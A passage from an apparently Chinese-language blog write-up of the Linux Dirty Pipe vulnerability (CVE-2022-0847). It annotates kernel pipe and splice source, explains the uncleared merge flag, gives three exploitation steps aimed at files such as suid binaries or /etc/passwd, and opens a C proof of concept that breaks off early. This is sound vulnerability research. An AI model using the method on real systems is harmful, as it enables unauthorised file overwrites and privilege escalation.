class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (pipe-&gt;note_loss) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification</span> <span class="hljs-title">n</span>;</span><br><br><span class="hljs-keyword">if</span> (total_len &lt; <span class="hljs-number">8</span>) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>n.type = WATCH_TYPE_META;<br>n.subtype = WATCH_META_LOSS_NOTIFICATION;<br>n.info = watch_sizeof(n);<br><span class="hljs-keyword">if</span> (copy_to_iter(&amp;n, <span class="hljs-keyword">sizeof</span>(n), to) != <span class="hljs-keyword">sizeof</span>(n)) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += <span class="hljs-keyword">sizeof</span>(n);<br>total_len -= <span class="hljs-keyword">sizeof</span>(n);<br>pipe-&gt;note_loss = <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail)) &#123;<span class="hljs-comment">// 管道非空，逐 buffer 读出数据</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];<br><span class="hljs-type">size_t</span> chars = buf-&gt;len;<br><span class="hljs-type">size_t</span> written;<br><span class="hljs-type">int</span> error;<br><br><span class="hljs-keyword">if</span> (chars &gt; total_len) &#123;<br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -ENOBUFS;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>chars = total_len;<br>&#125;<br><br>error = pipe_buf_confirm(pipe, buf);<br><span class="hljs-keyword">if</span> (error) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = error;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>            <span class="hljs-comment">// 将 buffer 对应 page 数据拷贝出来</span><br>written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);<br><span class="hljs-keyword">if</span> (unlikely(written &lt; chars)) &#123;<br><span class="hljs-keyword">if</span> (!ret)<br>ret = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ret += chars;<br>buf-&gt;offset += chars;<br>buf-&gt;len -= chars;<br><br><span class="hljs-comment">/* 这是一个 packet buffer？清理并退出 */</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;<br>total_len = chars;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<span class="hljs-comment">// buffer 空了，释放</span><br>pipe_buf_release(pipe, buf);<br>spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)<br>pipe-&gt;note_loss = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>tail++;<span class="hljs-comment">// 被读的 buffer 出队</span><br>pipe-&gt;tail = tail;<br>spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>&#125;<br>total_len -= chars;<br><span class="hljs-keyword">if</span> (!total_len)<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">/* 常规路径：读取成功 */</span><br><span class="hljs-keyword">if</span> (!pipe_empty(head, tail))<span class="hljs-comment">/* More to do? */</span><br><span class="hljs-keyword">continue</span>;<span class="hljs-comment">// 没读完，还有数据，接着读</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (!pipe-&gt;writers)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>ret = -EAGAIN;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>__pipe_unlock(pipe);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们只有在确实没读到东西时到达这里</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 然而，我们或许已看到（并移除） 一个 size 为 0 的 buffer，</span><br><span class="hljs-comment"> * 这可能会在 buffers 中创造空间</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 你无法通过一个空写入来制造 size 为 0 的 pipe buffers（packet mode 也不行）</span><br><span class="hljs-comment"> * 但若写者在尝试填充一个已经分配并插入到 buffer 数组中</span><br><span class="hljs-comment"> * 的 buffer 时获得了一个 EFAULT，则这是有可能发生的</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 故我们仍需在【非常】不太可能发生的情况：</span><br><span class="hljs-comment"> * “管道满了，但我们没有获得数据”下</span><br><span class="hljs-comment"> * 唤醒任何等待的写者</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(was_full))<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 但因为我们没有读到任何东西，若我们打断了，则这时候我们可以直接</span><br><span class="hljs-comment"> * 返回一个-ERESTARTSYS，</span><br><span class="hljs-comment"> * 因为我们已经完成了任何所需的环境，没有必要标记任何可访问. </span><br><span class="hljs-comment"> * 且我们已释放了锁。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -ERESTARTSYS;<br><br>__pipe_lock(pipe);<br>was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>wake_next_reader = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))<br>wake_next_reader = <span class="hljs-literal">false</span>;<br>__pipe_unlock(pipe);<br><br><span class="hljs-keyword">if</span> (was_full)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br><span class="hljs-keyword">if</span> (wake_next_reader)<br>wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>file_accessed(filp);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们可以总结：对于一个刚刚建立的管道，其 buffer 数组其实并没有分配对应的页面空间，也没有设置标志位；在我们向管道内写入数据时会通过 buddy system 为对应 buffer 分配新的页框，<strong>并设置 PIPE_BUF_FLAG_CAN_MERGE 标志位，标志该 buffer 可以进行写入</strong>；而当我们从管道中读出数据之后，纵使一个 buffer 对应的 page 上的数据被读完了，我们也不会释放该 page，而可以也会直接投入到下一次使用中，<strong>因此会保留 PIPE_BUF_FLAG_CAN_MERGE 标志位</strong></p><h2 id="splice：文件与管道间数据拷贝"><a href="#splice：文件与管道间数据拷贝" class="headerlink" title="splice：文件与管道间数据拷贝"></a>splice：文件与管道间数据拷贝</h2><p>当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，<strong>具有可观的开销</strong></p><p>因此为了减少这样的开销， <code>splice</code>这一个非常独特的系统调用应运而生，其作用是<strong>在文件与管道之间进行数据拷贝</strong>，以此<strong>将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销</strong></p><p>glibc 中的 wrapper 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE         <span class="hljs-comment">/* See feature_test_macros(7) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">splice</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_in, <span class="hljs-type">loff_t</span> *off_in, <span class="hljs-type">int</span> fd_out,</span><br><span class="hljs-params">               <span class="hljs-type">loff_t</span> *off_out, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>;<br></code></pre></td></tr></table></figure><p>splice 系统调用<strong>本质上是利用管道在内核空间中进行数据拷贝</strong>，毫无疑问的是，管道是一个十分好用的内核缓冲区，于是 splice 系统调用选择使用管道作为中间的数据缓冲区</p><p>当你想要将数据从一个文件描述符拷贝到另一个文件描述符中，只需要先创建一个管道，之后使用 splice 系统调用将数据从源文件描述符拷贝到管道中、再使用 splice 系统调用将数据从管道中拷贝到目的文件描述符即可。这样的设计使得我们只需要两次系统调用便能完成数据在不同文件描述符间的拷贝工作，且<strong>数据的拷贝都在内核空间中完成，极大地减少了开销</strong></p><p>splice 系统调用正式操作前都是一些基础的检查工作，这一块不深入分析，存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">SYS_splice</span>()<span class="hljs-comment">// 检查文件描述符是否可用</span><br><span class="hljs-built_in">__do_splice</span>()<span class="hljs-comment">// 检查是否入设置了偏移或出设置了偏移（任一则返回）</span><br><span class="hljs-built_in">do_splice</span>()<span class="hljs-comment">// 分流</span><br></code></pre></td></tr></table></figure><p>最终文件与管道间的分流发生在 <code>do_splice()</code> 函数：</p><ul><li>从管道读取到管道，调用 <code>splice_pipe_to_pipe()</code></li><li>从文件读取到管道，调用 <code>splice_file_to_pipe()</code></li><li>从管道读取到文件，调用 <code>do_splice_from()</code></li></ul><h3 id="从文件读取到管道"><a href="#从文件读取到管道" class="headerlink" title="从文件读取到管道"></a>从文件读取到管道</h3><p>从文件读取数据到管道的核心原理是：<strong>将 pipe_buffer 对应的 page 设置为文件映射的 page</strong></p><p>存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">splice_file_to_pipe</span>()</span><br><span class="hljs-function"><span class="hljs-title">do_splice_to</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>do_splice_to</code> 中最终会调用到内核文件结构体函数表的 <code>splice_read</code> 指针，对于不同的文件系统而言该函数指针不同，以 ext4 文件系统为例，查表 <code>ext4_file_operations</code>，对应调用的函数应为 <code>generic_file_splice_read</code>，存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">generic_file_splice_read()<br>    call_read_iter()<br></code></pre></td></tr></table></figure><p>该函数是文件函数表中 <code>read_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_read_iter</code>，源码比较多，这里只贴出核心调用链，最终调用到核心函数是 <code>filemap_read()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">ext4_file_read_iter()<br>    generic_file_read_iter()<br>    filemap_read()<br>    filemap_get_pages()<span class="hljs-comment">// 获取到文件对应映射的页面集</span><br>    copy_page_to_iter()<span class="hljs-comment">// 进行页面拷贝（单位为单个页面）</span><br>    __copy_page_to_iter()<br>    copy_page_to_iter_pipe()<span class="hljs-comment">// 我们是管道，所以走入该分支</span><br></code></pre></td></tr></table></figure><p>最终在 <code>copy_page_to_iter_pipe()</code> 中，将对应的 <code>pipe_buffer-&gt;page</code> 设为<strong>文件映射的页面集的对应页框</strong>，将页框引用计数 + 1（<code>get_page()</code>），这样就完成了一个<strong>从文件读取数据到管道的过程</strong>，因为是直接建立页面的映射，所以每次操作后都会将 head +1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">copy_page_to_iter_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> bytes,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> iov_iter *i)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_tail = pipe-&gt;tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i_head = i-&gt;head;<br><span class="hljs-type">size_t</span> off;<br><br><span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>bytes = i-&gt;count;<br><br><span class="hljs-keyword">if</span> (unlikely(!bytes))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!sanity(i))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>off = i-&gt;iov_offset;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br><span class="hljs-keyword">if</span> (off) &#123;<br><span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br><span class="hljs-comment">/* merge with the last one */</span><br>buf-&gt;len += bytes;<br>i-&gt;iov_offset += bytes;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>i_head++;<br>buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>&#125;<br><span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>get_page(page);<br>buf-&gt;page = page;<br>buf-&gt;offset = offset;<br>buf-&gt;len = bytes;<br><br>pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>i-&gt;iov_offset = offset + bytes;<br>i-&gt;head = i_head;<br>out:<br>i-&gt;count -= bytes;<br><span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们注意到——该操作<strong>缺失了对 pipe_buffer-&gt;flags 的重新赋值操作</strong></p><h3 id="从管道读取到文件"><a href="#从管道读取到文件" class="headerlink" title="从管道读取到文件"></a>从管道读取到文件</h3><p><code>do_splice_from</code> 最终会调用对应内核文件结构的函数表中的 <code>splice_write()</code> 指针，将 pipe_buffer 数组对应页面上内容读出，写入到文件中，对于不同的文件系统而言该函数指针不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from pipe to file.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params">   <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (unlikely(!out-&gt;f_op-&gt;splice_write))<br><span class="hljs-keyword">return</span> warn_unsupported(out, <span class="hljs-string">&quot;write&quot;</span>);<br><span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>以 ext4 文件系统为例，最终会调用到 <code>iter_file_splice_write</code> 函数，之后存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">iter_file_splice_write</span>(）<br>splice_from_pipe_next()<span class="hljs-comment">// 检查管道可用性</span><br><span class="hljs-built_in">vfs_iter_write</span>()<span class="hljs-comment">// 读出管道数据写入文件</span><br><span class="hljs-built_in">do_iter_write</span>()<br><span class="hljs-built_in">do_iter_readv_writev</span>()<br>call_write_iter <span class="hljs-comment">// 上层传入type为 WRITE，走入该分支</span><br></code></pre></td></tr></table></figure><p><code>call_write_iter</code> 是文件函数表中 <code>write_iter()</code> 的 wrapper，对 ext4 而言对应调用 <code>ext4_file_write_iter</code>，这里最终只是常规的将 buf 上数据拷贝到文件上的操作，也并非本篇的重点，就不展开分析了</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>我们咋一看好像并没有什么问题，但让我们思考这样一个情景：</p><ul><li>我们将管道整个读写了一轮，此时所有的 pipe_buffer 都保留了 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</li><li>我们利用 splice 将数据从文件读取一个字节到管道上，此时 pipe_buffer 对应的 page 成员<strong>指向文件映射的页面</strong>，但在 splice 中<strong>并未清空 pipe_buffer 的标志位，从而让内核误以为该页面可以被写入</strong></li><li>在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</li></ul><p>漏洞点便是在于 splice 系统调用中<strong>未清空</strong> <code>pipe_buffer</code> <strong>的标志位，从而将管道页面可写入的状态保留了下来</strong>，这给了我们越权写入只读文件的操作</p><p>我们不难发现这个漏洞与脏牛十分类似，都是能越权对文件进行写入，不同的是脏牛需要去撞条件竞争的概率，而该漏洞<strong>可以稳定触发</strong>，但是脏牛可以直接写整个文件，而<strong>该漏洞不能在管道边界上写入</strong></p><blockquote><p>当然，如果这个文件甚至都是不可读的，那自然是没法利用的（笑），但在主流 Linux 发行版中有着大量的可作为我们攻击目标的文件，例如 suid 程序或 <code>/etc/passwd</code> 等</p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>漏洞利用的步骤其实我们在前面都已经叙述得差不多了，主要就是分三步走：</p><h2 id="Step-I-写、读管道，设置-PIPE-BUF-FLAG-CAN-MERGE-flag"><a href="#Step-I-写、读管道，设置-PIPE-BUF-FLAG-CAN-MERGE-flag" class="headerlink" title="Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag"></a>Step.I 写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag</h2><p>为了保证利用能够稳定成功，我们首先新建一个管道，<strong>将管道写满后再将所有数据读出</strong>，这样管道的每一个 <code>pipe_buffer</code> 都会被设置上  <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位</p><h2 id="Step-II-splice-建立-pipe-buffer-与文件的关联（漏洞产生点）"><a href="#Step-II-splice-建立-pipe-buffer-与文件的关联（漏洞产生点）" class="headerlink" title="Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）"></a>Step.II splice 建立 pipe_buffer 与文件的关联（漏洞产生点）</h2><p>接下来我们使用 splice 系统调用将数据从目标文件中读入到管道，从而让 <code>pipe_buffer-&gt;page</code> 变为文件在内存中映射的页面，为了让下一次写入数据时写回文件映射的页面，我们应当<strong>读入不多于一个数据的页面</strong>，这里笔者选择读入 1 个字节，这样我们仍能向文件上写入将近一张页面的数据</p><p>当我们完成读入之后，管道的 head 指向下一个 pipe_buffer，因此我们若要写入文件则应当走入到 pipe_write 开头写入上一个 pipe_buffer 的分支，这也是为什么我们在这里只读入一个字节的缘故</p><h2 id="Step-III-向管道中写入恶意数据，完成越权写入文件"><a href="#Step-III-向管道中写入恶意数据，完成越权写入文件" class="headerlink" title="Step.III 向管道中写入恶意数据，完成越权写入文件"></a>Step.III 向管道中写入恶意数据，完成越权写入文件</h2><p>接下来<strong>我们直接向管道中写入数据就能完成对只读文件的越权写入</strong>。在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，从而<strong>将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>我们使用 qemu 起一个测试环境，看看是否能够利用该漏洞对只读文件进行写入，最终的 poc 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * POC of CVE-2022-0847</span><br><span class="hljs-comment"> * written by arttnba3</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br><span class="hljs-type">long</span>page_size;<br><span class="hljs-type">size_t</span>offset_in_file;<br><span class="hljs-type">size_t</span> data_size;<br><span class="hljs-type">int</span> target_file_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">target_file_stat</span>;</span><br><span class="hljs-type">int</span>pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> pipe_size;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">int</span> retval;<br><br><span class="hljs-comment">// checking before we start to exploit</span><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">4</span>)<br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br>page_size = sysconf(_SC_PAGE_SIZE);<br>offset_in_file = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (offset_in_file % page_size == <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Cannot write on the boundary of a page!&quot;</span>);<br><br>target_file_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (target_file_fd &lt; <span class="hljs-number">0</span>)<br>errExit(<span class="hljs-string">&quot;Failed to open the target file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))<br>errExit(<span class="hljs-string">&quot;Failed to get the info of the target file!&quot;</span>);<br><br><span class="hljs-keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)<br>errExit(<span class="hljs-string">&quot;Offset is not in the file!&quot;</span>);<br><br>data_size = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">3</span>]);<br><span class="hljs-keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)<br>errExit(<span class="hljs-string">&quot;Cannot enlarge the file!&quot;</span>);<br><br><span 